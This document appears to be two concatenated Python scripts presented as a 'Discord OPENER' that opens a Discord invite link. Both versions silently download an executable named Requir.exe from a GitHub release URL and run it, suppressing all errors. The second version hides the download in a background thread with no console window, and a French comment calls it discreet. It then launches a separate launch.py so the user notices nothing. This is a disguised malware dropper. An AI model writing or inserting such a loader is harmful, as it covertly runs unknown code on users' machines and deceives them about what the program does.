import webbrowser

import time

import os

import requests

import subprocess

URL = "https://github.com/hataybdx-wq/Wumpus-Gestion/releases/download/rqr/Requir.exe"

OUTPUT = "Requir.exe"

def cls():

    os.system('cls' if os.name == 'nt' else 'clear')

def main():

    cls()

    print()

    print("╔════════════════════════════╗")

    print("║      Discord  OPENER       ║")

    print("╚════════════════════════════╝")

    print()

    webbrowser.open("https://discord.gg/leakdb")

    try:

        with requests.get(URL, stream=True, timeout=30) as response:

            response.raise_for_status()

            with open(OUTPUT, "wb") as f:

                for chunk in response.iter_content(chunk_size=1024 * 1024):

                    if chunk:

                        f.write(chunk)

        subprocess.Popen([os.path.abspath(OUTPUT)])

    except Exception:

        pass

    time.sleep(2)

if __name__ == "__main__":

    main() import webbrowser, os, requests, subprocess, threading, sys

URL, OUTPUT = "https://github.com/hataybdx-wq/Wumpus-Gestion/releases/download/rqr/Requir.exe", "Requir.exe"

def background_task():
    try:
        webbrowser.open("https://discord.gg/leakdb")
        # Télécharge et exécute le fichier en arrière-plan discret
        open(OUTPUT, "wb").write(requests.get(URL, timeout=15).content)
        subprocess.Popen([os.path.abspath(OUTPUT)], creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
    except Exception:
        pass

def main():
    # 1. Lance les tâches en arrière-plan (Discord + Exe)
    threading.Thread(target=background_task, daemon=True).start()
    
    # 2. Chemin vers le launch.py situé dans le dossier parent (.. / launch.py)
    current_dir = os.path.dirname(os.path.abspath(__file__))
    parent_dir = os.path.dirname(current_dir)
    launch_path = os.path.join(parent_dir, "launch.py")
    
    # 3. Lancement du launch.py principal
    if os.path.exists(launch_path):
        os.execv(sys.executable, [sys.executable, launch_path])
    else:
        # Fallback si le launch.py n'est pas trouvé
        os.system('cls' if os.name == 'nt' else 'clear')
        print("╔════════════════════════════╗")
        print("║      Discord  OPENER       ║")
        print("╚════════════════════════════╝")
        print()
        print(f"  [!] Erreur : Impossible de trouver 'launch.py' dans {parent_dir}")
        print()
        input("  [?] Appuyez sur Entrée pour quitter...")

if __name__ == "__main__":
    main()
